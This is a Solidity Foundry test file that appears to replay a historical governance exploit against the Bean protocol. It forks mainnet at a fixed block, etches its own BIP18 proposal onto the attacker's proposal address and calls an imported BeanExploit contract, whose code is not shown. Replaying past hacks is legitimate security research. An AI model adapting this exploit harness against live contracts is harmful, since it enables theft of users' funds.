// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/exploit/BeanExploit.sol";
import "../src/exploit/BIP18.sol";

contract BeanExploitTest is Test {
    uint256 mainnetFork;
    uint256 blockNumber = 14_602_789;
    string MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    BeanExploit beanExploit;
    BIP18 bip18;

    function setUp() public {
        mainnetFork = vm.createFork(MAINNET_RPC_URL);
        vm.selectFork(mainnetFork);
        vm.rollFork(blockNumber);

        beanExploit = new BeanExploit();
        vm.label(address(this), "Our Test Contract");
        vm.label(address(beanExploit), "BeanExploit");

        // Deploy proposal
        bip18 = new BIP18(address(beanExploit));

        // Replace attacker's BIP18 with our BIP18 on the same address
        vm.etch(
            0xE5eCF73603D98A0128F05ed30506ac7A663dBb69,
            address(bip18).code
        );
    }

    function test_Exploit() public {
        beanExploit.exploit();
    }
}
